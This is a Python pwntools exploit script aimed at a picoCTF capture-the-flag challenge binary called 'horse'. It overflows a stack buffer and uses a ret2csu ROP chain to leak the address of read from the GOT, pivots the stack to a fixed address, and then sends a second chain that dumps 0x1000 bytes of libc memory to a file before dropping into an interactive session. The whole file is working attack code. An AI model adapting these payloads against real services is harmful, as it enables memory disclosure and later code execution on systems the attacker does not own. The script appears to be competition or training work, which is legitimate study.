from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
pop_rbp_chain = 0x400bfb 
main_skip_setup = 0x400b6f
# Safe stack in heap
safe_rbp = 0x603000 

def leak_read():
    payload = b'A' * 32
    payload += b'B' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Return to main_skip_setup with RBP = safe_rbp
    payload += p64(pop_rbp_chain)
    payload += p64(safe_rbp) 
    payload += p64(0) * 4     
    payload += p64(main_skip_setup) 

    log.info("Sending leak payload...")
    r.sendline(payload)
    
    r.recvuntil(b'/     /   \xc2\xb4\n')
    
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        log.success(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except Exception as e:
        log.error(f"Failed to receive leak: {e}")
        exit()

leaked_read = leak_read()

# Payload 2: Dump libc
# Sent to read(0, safe_rbp - 0x20, 0x80)
# safe_rbp = 0x603000. Buffer = 0x602fe0.
# Main does leave; ret.
# rsp -> 0x603000. ret -> 0x603008.
# Buffer at 0x602fe0.
# Difference 0x603008 - 0x602fe0 = 0x28 (40 bytes).
# So padding 40 bytes.

payload = b'C' * 40
# ROP to dump 0x1000 bytes from leaked_read
payload += p64(csu_pop)
payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(leaked_read) + p64(0x1000)
payload += p64(csu_call)
payload += b'J' * 8 
payload += b'K' * 48
payload += p64(0xdeadbeef)

log.info("Sending dump payload...")
r.sendline(payload)

r.recvuntil(b'/     /   \xc2\xb4\n')

# Receive dump
try:
    dump = r.recvn(0x1000)
    log.info("Dump received")
    print(hexdump(dump[:64]))
    with open('libc_dump.bin', 'wb') as f:
        f.write(dump)
except Exception as e:
    log.error(f"Failed dump: {e}")

r.interactive()
